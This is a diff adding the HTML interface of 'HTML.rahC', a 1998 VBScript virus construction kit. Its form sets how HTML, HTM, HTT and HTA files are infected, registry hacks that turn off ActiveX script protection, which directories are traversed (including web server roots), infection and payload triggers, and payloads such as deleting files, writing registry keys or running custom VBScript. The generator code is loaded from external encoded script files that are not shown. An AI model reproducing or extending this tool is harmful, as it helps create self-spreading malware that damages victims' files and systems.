@@ -1,0 +1,369 @@
+<!--1nternal-->
+<html>
+
+<head>
+<meta http-equiv="Content-Type"
+content="text/html; charset=iso-8859-1">
+<meta name="Author" content="1nternal">
+<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0 & NotePad">
+<title>HTML.rahC - Random Anarchy HTML Constructor. ©1nternal 1998</title>
+</head>
+
+<body bgcolor="#C0C0C0">
+<div align="center"><center>
+
+<table border="2" cellpadding="3" cellspacing="3" width="40%"
+bordercolordark="#FFFFFF" bordercolorlight="#808080">
+    <tr>
+        <td width="100%"><p align="center"
+        onclick="VBScript:window.status=EggTest1()"><font
+        size="2" face="Arial">HTML.rahC<br>
+        Random Anarchy HTML Constructor<br>
+        ©1nternal 1998</font></p>
+        </td>
+    </tr>
+</table>
+</center></div>
+
+<form name="VInfo">
+    <input type="hidden" name="GUIAuthorDesc" value="1nternal"><input
+    type="hidden" name="GUIMajorDesc" value="rahC"><input
+    type="hidden" name="GUIMajorVer" value="0"><input
+    type="hidden" name="GUIMinorDesc" value="Standard"><input
+    type="hidden" name="GUIMinorVer" value="1"><input
+    type="hidden" name="GUIRevision" value="0"><input
+    type="hidden" name="GUIYearDate" value="1998"><div
+    align="center"><center><table border="2" cellpadding="3"
+    cellspacing="4" width="100%" bgcolor="#C0C0C0"
+    bordercolordark="#FFFFFF" bordercolorlight="#808080">
+        <tr>
+            <td valign="top" colspan="2" width="20%"
+            bgcolor="#C0C0C0"><font size="2" face="Arial">Properties</font></td>
+            <td valign="top" colspan="2" width="80%"
+            bgcolor="#C0C0C0"><font size="2" face="Arial">Generation
+            Name: <input type="text" size="20" name="GenName"
+            value="Spinoff"
+            onclick="window.status='Sub class name of generation'"><br>
+            ID Tag: <input type="text" size="20" name="IDTag"
+            value="1nternal"
+            onfocus="window.status='Identifier to use to prevent re-infection'"><br>
+            Generation Seed: <input type="text" size="5"
+            name="GenSeed"
+            onfocus="window.status='Leave blank for a random seed'">(leave
+            blank for random)</font></td>
+        </tr>
+        <tr>
+            <td valign="top" colspan="2" width="20%"
+            bgcolor="#C0C0C0"><font size="2" face="Arial">Anti-AV
+            Reghacks</font></td>
+            <td valign="top" colspan="2" width="80%"
+            bgcolor="#C0C0C0"><font size="2" face="Arial"><input
+            type="checkbox" name="Current" value="ON"
+            onfocus="window.status='Disable ActiveX script protection for &quot;Current user&quot;'">Disable
+            'Current User' My Computer Zone<br>
+            <input type="checkbox" name="Local" value="ON"
+            onfocus="window.status='Disable ActiveX script protection for &quot;Local Machine&quot;'">Disable
+            'Local Machine' My Computer Zone</font></td>
+        </tr>
+        <tr>
+            <td valign="top" colspan="2" width="20%"
+            bgcolor="#C0C0C0"><font size="2" face="Arial">Execution
+            Probability</font></td>
+            <td valign="top" colspan="2" width="80%"
+            bgcolor="#C0C0C0"><font size="2" face="Arial"><input
+            type="checkbox" checked name="ExecOffline" value="ON"
+            onfocus="window.status='Will only execute if detected as running offline'">Only
+            when offline (needed for FSO operations)<br>
+            <input type="radio" checked name="ExecProb"
+            value="Every"
+            onfocus="window.status='Will execute everytime, depending on &quot;Offline&quot; option'">Everytime<br>
+            <input type="radio" name="ExecProb" value="Day"
+            onfocus="window.status='Day of month to execute'">On
+            day of month<input type="text" size="3"
+            name="DayValExec" value="1"><br>
+            <input type="radio" name="ExecProb" value="Week"
+            onfocus="window.status='Week day to execute'">On day
+            of week <select name="WeekExec" size="1">
+                <option value="2">Monday</option>
+                <option value="3">Tuesday</option>
+                <option value="4">Wednesday</option>
+                <option value="5">Thursday</option>
+                <option value="6">Friday</option>
+                <option value="7">Saturday</option>
+                <option value="1">Sunday</option>
+            </select><br>
+            <input type="radio" name="ExecProb" value="Rand"
+            onfocus="window.status='Probability ratio. 1:Defined'">Random
+            1/<input type="text" size="3" name="ExecMax"
+            value="6"><br>
+            <input type="radio" name="ExecProb" value="Misc"
+            onfocus="window.status='Legal one line conditional statement, without &quot;if..then&quot;'">Misc
+            {If <input type="text" size="41" name="ExecLine"
+            value="Int((5 * Rnd) + 1) = 1">then}</font></td>
+        </tr>
+        <tr>
+            <td valign="top" colspan="2" width="20%"
+            bgcolor="#C0C0C0"><font size="2" face="Arial">Code
+            Options</font></td>
+            <td valign="top" colspan="2" width="80%"
+            bgcolor="#C0C0C0"><font size="2" face="Arial"><input
+            type="checkbox" name="JunkLines" value="ON"
+            onfocus="window.status='Randomly generates a random comment on its own line'">Generate
+            Junk Comment Lines<br>
+            <input type="checkbox" name="Jcomments" value="ON"
+            onfocus="window.status='Randomly adds a junk comment to existing code lines'">Generate
+            Junk Comments<br>
+            <input type="checkbox" checked name="RandVars"
+            value="ON"
+            onfocus="window.status='Randomises variable names, otherwise use defaults'">Random
+            variable names</font></td>
+        </tr>
+        <tr>
+            <td valign="top" colspan="2"><font size="2"
+            face="Arial">Infection Probability</font></td>
+            <td valign="top" colspan="2"><font size="2"
+            face="Arial"><input type="checkbox" name="InfOffline"
+            value="ON"
+            onfocus="window.status='Will only infect if detected as running offline'">Only
+            when offline (often not necessary)<br>
+            <input type="radio" name="InfProb" value="None"
+            onfocus="window.status='Will not add viral infection code. Trojan only'">No
+            Infection<br>
+            <input type="radio" name="InfProb" value="Every"
+            onfocus="window.status='Will infect everytime, depending on &quot;Offline&quot; option'">Everytime<br>
+            <input type="radio" name="InfProb" value="Day"
+            onfocus="window.status='Day of month to infect'">On
+            day of month<input type="text" size="3"
+            name="DayValInf" value="1"><br>
+            <input type="radio" name="InfProb" value="Week"
+            onfocus="window.status='Week day to infect'">On day
+            of week <select name="InfWeek" size="1">
+                <option value="2">Monday</option>
+                <option value="3">Tuesday</option>
+                <option value="4">Wednesday</option>
+                <option value="5">Thursday</option>
+                <option value="6">Friday</option>
+                <option value="7">Saturday</option>
+                <option value="1">Sunday</option>
+            </select><br>
+            <input type="radio" checked name="InfProb"
+            value="Rand"
+            onfocus="window.status='Probability ratio. 1:Defined'">Random
+            1/<input type="text" size="3" name="InfMax" value="6"><br>
+            <input type="radio" name="InfProb" value="Misc"
+            onfocus="window.status='Legal one line conditional statement, without &quot;if..then&quot;'">Misc
+            {If <input type="text" size="41" name="InfLine"
+            value="Int((5 * Rnd) + 1) = 1">then}</font></td>
+        </tr>
+        <tr>
+            <td valign="top" colspan="2" width="20%"
+            bgcolor="#C0C0C0"><font size="2" face="Arial">File
+            access method</font></td>
+            <td valign="top" colspan="2" width="80%"
+            bgcolor="#C0C0C0"><input type="checkbox" checked
+            name="CreateRange" value="ON"><font size="2"
+            face="Arial">Read Host using CreateTextRange().
+            (Required for default infect file routine)<br>
+            <input type="radio" name="OpenMethod"
+            value="TextFile">Text File<br>
+            <input type="radio" name="OpenMethod"
+            value="TextStream">Text Stream<br>
+            <input type="radio" checked name="OpenMethod"
+            value="Rand">Random</font></td>
+        </tr>
+        <tr>
+            <td valign="top" colspan="2" width="20%"
+            bgcolor="#C0C0C0"><font size="2" face="Arial">Infection</font></td>
+            <td valign="top" colspan="2" width="80%"
+            bgcolor="#C0C0C0"><font size="2" face="Arial">Select
+            at least one<br>
+            <input type="checkbox" checked name="HTML"
+            value="HTML">*.HTML<br>
+            <input type="checkbox" checked name="HTM" value="HTM">*.HTM<br>
+            <input type="checkbox" checked name="HTT" value="HTT">*.HTT<br>
+            <input type="checkbox" name="HTA" value="HTA">*.HTA<br>
+            <input type="checkbox" name="MiscExt" value="ON"
+            onfocus="window.status='Enter base extension only'">Misc
+            Extension <input type="text" size="5" name="ExtName"
+            value="HTX"></font></td>
+        </tr>
+        <tr>
+            <td valign="top" colspan="2"><font size="2"
+            face="Arial">Infect Folder Routine</font></td>
+            <td valign="top" colspan="2"><font size="2"
+            face="Arial"><input type="radio" checked
+            name="FolderRoutine" value="Default">Default<br>
+            <input type="radio" name="FolderRoutine"
+            value="CustomA">CustomA (N/A)<br>
+            <input type="radio" name="FolderRoutine"
+            value="CustomB">CustomB (N/A)</font></td>
+        </tr>
+        <tr>
+            <td valign="top" colspan="2"><font size="2"
+            face="Arial">Infect File Routine</font></td>
+            <td valign="top" colspan="2"><font size="2"
+            face="Arial"><input type="radio" checked
+            name="FileRoutine" value="Default">Default<br>
+            <input type="radio" name="FileRoutine"
+            value="CustomA">CustomA (N/A)<br>
+            <input type="radio" name="FileRoutine"
+            value="CustomB">CustomB (N/A)</font></td>
+        </tr>
+        <tr>
+            <td valign="top" rowspan="4" colspan="2" width="20%"
+            bgcolor="#C0C0C0"><font size="2" face="Arial">Infect
+            Folder Options*</font></td>
+            <td valign="top" colspan="2" width="80%"
+            bgcolor="#C0C0C0"><input type="checkbox" checked
+            name="CheckExist" value="ON"><font size="2"
+            face="Arial">Check if folder exists<br>
+            </font><input type="checkbox" checked
+            name="CheckInfected" value="ON"><font size="2"
+            face="Arial">Check if file already infected</font></td>
+        </tr>
+        <tr>
+            <td valign="top" width="20%" bgcolor="#C0C0C0"><font
+            size="2" face="Arial">Traversal</font></td>
+            <td valign="top" width="60%" bgcolor="#C0C0C0"><font
+            size="2" face="Arial"><input type="radio"
+            name="Directory" value="Single">Single Directory Only<br>
+            <input type="radio" checked name="Directory"
+            value="Parent">Parent Directories</font></td>
+        </tr>
+        <tr>
+            <td valign="top" width="20%" bgcolor="#C0C0C0"><font
+            size="2" face="Arial">Loop Options</font></td>
+            <td valign="top" width="60%" bgcolor="#C0C0C0"><font
+            size="2" face="Arial"><input type="radio" checked
+            name="LoopOp" value="LoopU">Do...Loop Until<br>
+            <input type="radio" name="LoopOp" value="LoopW">Do...Loop
+            While<br>
+            <input type="radio" name="LoopOp" value="WhileW">While...Wend
+            (Will endless loop if ActiveX prompt fails)</font></td>
+        </tr>
+        <tr>
+            <td valign="top"><font size="2" face="Arial">Infected
+            Check</font></td>
+            <td valign="top"><font size="2" face="Arial"><input
+            type="radio" name="InfCheck" value="TestString">Test
+            String<br>
+            <input type="radio" checked name="InfCheck"
+            value="ReadLine">Readline</font></td>
+        </tr>
+        <tr>
+            <td valign="top" colspan="2" width="20%"
+            bgcolor="#C0C0C0"><font size="2" face="Arial">Target
+            Directories</font></td>
+            <td valign="top" colspan="2" width="80%"
+            bgcolor="#C0C0C0"><input type="checkbox" checked
+            name="InfCurrent" value="ON"><font size="2"
+            face="Arial">Infect Current directory<br>
+            <input type="checkbox" name="DirHard" value="ON"
+            onfocus="window.status='Run infection routine on hard coded directories'">Infect
+            Hard Coded Directories (enter only as many as needed)<br>
+            <input type="text" size="20" name="Dir1"
+            value="C:\Inetpub\wwwroot"><br>
+            <input type="text" size="20" name="Dir2"
+            value="C:\Windows\Web"><br>
+            <input type="text" size="20" name="Dir3"
+            value="C:\My Documents"><br>
+            <input type="text" size="20" name="Dir4"><br>
+            <input type="text" size="20" name="Dir5"></font></td>
+        </tr>
+        <tr>
+            <td valign="top" colspan="2" width="20%"
+            bgcolor="#C0C0C0"><font size="2" face="Arial">PayLoad
+            Trigger</font></td>
+            <td valign="top" colspan="2" width="80%"
+            bgcolor="#C0C0C0"><font size="2" face="Arial"><input
+            type="checkbox" name="TriggerOffline" value="ON"
+            onfocus="window.status='Will only trigger if detected as running offline'">Only
+            when offline (often not necessary)<br>
+            <input type="checkbox" name="TrigInfect" value="ON">Only
+            <input type="radio" name="TrigPlace" value="Before">Before
+            Infection <input type="radio" checked
+            name="TrigPlace" value="After">After Infection<br>
+            <input type="radio" name="Trigger" value="None"
+            onfocus="window.status='Will not add payload routine'">No
+            Payload<br>
+            <input type="radio" name="Trigger" value="Every"
+            onfocus="window.status='Will trigger everytime, where possible'">Everytime<br>
+            <input type="radio" name="Trigger" value="Day"
+            onfocus="window.status='Day of month to trigger'">Trigger
+            on day of month<input type="text" size="3"
+            name="DayValTrig" value="1"><br>
+            <input type="radio" name="Trigger" value="Week"
+            onfocus="window.status='Week day to run payload'">Trigger
+            on day of week <select name="WeekDayTrig" size="1">
+                <option value="2">Monday</option>
+                <option value="3">Tuesday</option>
+                <option value="4">Wednesday</option>
+                <option value="5">Thursday</option>
+                <option value="6">Friday</option>
+                <option value="7">Saturday</option>
+                <option value="1">Sunday</option>
+            </select><br>
+            <input type="radio" checked name="Trigger"
+            value="Rand"
+            onfocus="window.status='Probability ratio. 1:Defined'">Random
+            Trigger. 1/<input type="text" size="3" name="TrigMax"
+            value="10"><br>
+            <input type="radio" name="Trigger" value="Misc"
+            onfocus="window.status='Legal one line conditional statement, without &quot;if..then&quot;'">Misc
+            Trigger {If <input type="text" size="41"
+            name="TrigLine"
+            value="confirm(&quot;Execute payload?&quot;)">then}</font></td>
+        </tr>
+        <tr>
+            <td valign="top" colspan="2" width="20%"><font
+            size="2" face="Arial">PayLoad Routine</font></td>
+            <td valign="top" colspan="2" width="80%"><font
+            size="2" face="Arial"><input type="radio" checked
+            name="Payload" value="msgbox"
+            onfocus="window.status='String to display in a &quot;msgbox&quot;, without quotes'">Msgbox
+            <input type="text" size="47" name="msgtext"
+            value="Hello World!"><br>
+            <input type="radio" name="Payload" value="status"
+            onfocus="window.status='String to display in status bar, without quotes'">StatusBar
+            <input type="text" size="47" name="statbartext"
+            value="Hello World!"><br>
+            <input type="radio" name="Payload" value="redirect"
+            onfocus="window.status='URL to redirect to. Legal &quot;Replace&quot; argument'">Redirect
+            URL <input type="text" size="47" name="UrlText"
+            value="http://www.sourceofkaos.com/homes/1nternal"><br>
+            <input type="radio" name="Payload" value="regkey"
+            onfocus="window.status='Legal &quot;Regwrite&quot; argument/s'">Change
+            Registry Key {RegWrite(<input type="text" size="48"
+            name="regkeytext"
+            value="&quot;HKEY_USERS\.DEFAULT\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon\&quot;, &quot;C:\WINDOWS\SYSTEM\Pifmgr.dll,32&quot;">)}<br>
+            <input type="radio" name="Payload" value="delfile"
+            onfocus="window.status='File to delete'">Delete File:
+            <input type="text" size="29" name="DelFileName"
+            value="C:\Test.txt"><br>
+            <input type="radio" name="Payload" value="misc">Misc
+            Payload (Recommended)<br>
+            <textarea name="TextData" rows="8" cols="71"
+            onfocus="window.status='VBScript custom payload'">Type here a custom payload.</textarea></font></td>
+        </tr>
+    </table>
+    </center></div><p align="center"><font size="2" face="Arial">*
+    May only apply to default &quot;Infect Folder&quot; routine.<br>
+    <input type="reset" name="ResetIt" value="Reset"
+    onclick="VBScript:window.status=EggTest2()"><br>
+    <br>
+    <input type="button" name="GenRuntime" value="Generate"
+    onclick="VBScript:GV"><br>
+    </font><font size="1" face="Arial">(it is recommended that
+    you edit the source code)<br>
+    <br>
+    </font></p>
+</form>
+<script language="VBScript"><!--
+	Public GUICopyString
+	GUICopyString = VInfo.GUIMajorDesc.Value & "." & VInfo.GUIMinorDesc.Value & " v" & VInfo.GUIMajorVer.Value & "." & VInfo.GUIMinorVer.Value & " Copyright " & VInfo.GUIYearDate.Value & ". " & VInfo.GUIAuthorDesc.Value
+	document.write "<p align=""Center""><font size=""1"" face=""Arial"">GUI: " & GUICopyString & "</font></p>"
+--></script>
+<script language="VBScript" src="plugin.vbs"></script>
+<script language="VBScript.Encode" src="rahc1.vbe"></script>
+</body>
+</html>
